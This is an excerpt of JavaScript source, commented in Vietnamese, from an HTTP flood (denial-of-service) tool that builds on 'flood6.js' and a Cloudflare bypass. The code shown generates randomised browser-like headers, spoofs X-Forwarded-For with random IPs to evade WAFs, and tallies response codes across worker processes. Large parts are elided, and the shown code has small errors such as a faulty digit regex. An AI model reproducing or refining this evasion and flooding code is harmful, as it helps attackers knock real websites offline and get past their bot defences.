...
// ========== USER-AGENT PARSER (từ flood6.js - tối ưu) ==========
function parseUserAgent(uaString) {
    ...
    const fullVersion = browserMatch ? browserMatch[2] : '0';
    ...
    let secChUa = '';
    if (browser === 'Chrome') {
        secChUa = `"Chromium";v="${majorVersion}", "Not)A;Brand";v="24", "Google Chrome";v="${majorVersion}"`;
    } else {
    ...
    return {
        ...
        'sec-ch-ua-platform-version': platformVersion ? `"${platformVersion}"` : '',
        'sec-ch-ua-full-version-list': secChUaFullVersionList
    };
}

// ========== DYNAMIC HEADERS (từ flood6.js + nâng cấp) ==========
...
// Random IP generator (từ flood6.js)
function randomIp() {
...
// Generate random string (từ flood6.js)
function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
...
// Hàm tạo dynamic headers (kết hợp flood6.js + cloudflare bypass)
function generateDynamicHeaders(ua, targetUrl) {
    const uaHeaders = parseUserAgent(ua);
    const randomEngine = searchEngines[Math.floor(Math.random() * searchEngines.length)];

    // Base dynamic headers từ flood6.js
    let dynHeaders = {
    ...
    // Thêm platform version nếu có
    if (uaHeaders['sec-ch-ua-platform-version']) {
        dynHeaders['sec-ch-ua-platform-version'] = uaHeaders['sec-ch-ua-platform-version'];
    }

    // Accept-encoding (80% chance)
    if (Math.random() < 0.8) {
        dynHeaders["accept-encoding"] = acceptEncodings[Math.floor(Math.random() * acceptEncodings.length)];
    }

    // X-Forwarded-For (30% chance) - bypass WAF
    if (Math.random() < 0.3) {
        dynHeaders["x-forwarded-for"] = randomIp();
    }

    // Advanced headers (50% chance) - từ flood6.js
    if (Math.random() >= 0.5) {
        // Origin header
        if (Math.random() < 0.5) {
            dynHeaders["origin"] = new URL(targetUrl).origin;
        }

        // X-Client-Data (Chrome-specific, 30% chance)
        if (Math.random() < 0.3) {
            dynHeaders["x-client-data"] = generateRandomString(20, 30);
        }

        // Sec-CH-Prefers-Color-Scheme (40% chance)
        if (Math.random() < 0.4) {
            dynHeaders['sec-ch-prefers-color-scheme'] = Math.random() < 0.5 ? 'light' : 'dark';
        }

        // Sec-CH-Viewport-Width (20% chance)
        if (Math.random() < 0.2) {
            dynHeaders['sec-ch-viewport-width'] = (Math.floor(Math.random() * (1920 - 360 + 1)) + 360).toString();
        }
    }

    // Advanced headers variant 2 (từ dynHeadersd trong flood6.js)
    if (Math.random() >= 0.5) {
        // Priority header (HTTP/2)
        dynHeaders["priority"] = "u=0, i";

        // Clear-Site-Data (30% chance)
        if (Math.random() < 0.3) {
            dynHeaders['Clear-Site-Data'] = "cache";
        }

        // Refresh header
        dynHeaders["Refresh"] = "36600, url=" + targetUrl;

        // Set-Login (50% chance)
        if (Math.random() < 0.5) {
            dynHeaders['Set-Login'] = Math.random() < 0.5 ? "logged-in" : "logged-out";
        }

        // Origin-Agent-Cluster (50% chance)
        if (Math.random() < 0.5) {
            dynHeaders["Origin-Agent-Cluster"] = '?1';
        }

        // Sec-CH-Prefers-Reduced-Motion (40% chance)
        if (Math.random() < 0.4) {
            dynHeaders["sec-ch-prefers-reduced-motion"] = "no-preference";
        }

        // Sec-CH-UA-Arch (30% chance)
        if (Math.random() < 0.3) {
            dynHeaders["sec-ch-ua-arch"] = '"\"x86\""';
        }

        // Sec-CH-UA-Bitness (20% chance)
        if (Math.random() < 0.2) {
            dynHeaders["sec-ch-ua-bitness"] = '"\"64\""';
        }
    }
...
/*if (debugMode) {
    setInterval(() => {
        ...
        // Chỉ log tổng hợp trạng thái, không thêm thông tin rườm rà
    ...
    setInterval(() => {
        ...
        for (let w in workers) {
            if (workers[w][0].state === "online") {
                for (let st of workers[w][1]) {
                    for (let code in st) {
                        // Lọc chỉ giữ những code thuộc dạng số hoặc các trạng thái cụ thể mong muốn
                        if (/^d+$/.test(code) || ["CLOSED", "GOAWAY"].includes(code)) {
                            if (!statusesAll[code]) statusesAll[code] = 0;
                            statusesAll[code] += st[code];
                        }
                    }
...
function logSummaryStatuses(workers) {
    let statusesAll = {};
    for (let w in workers) {
        if (workers[w][0].state === "online") {
            for (let st of workers[w][1]) {
                for (let code in st) {
                    // Chỉ giữ các mã status dạng số hoặc các trạng thái đặc biệt mong muốn
                    if (/^d+$/.test(code) || ["CLOSED", "GOAWAY"].includes(code)) {
                        if (!statusesAll[code]) statusesAll[code] = 0;
                        statusesAll[code] += st[code];
                    }
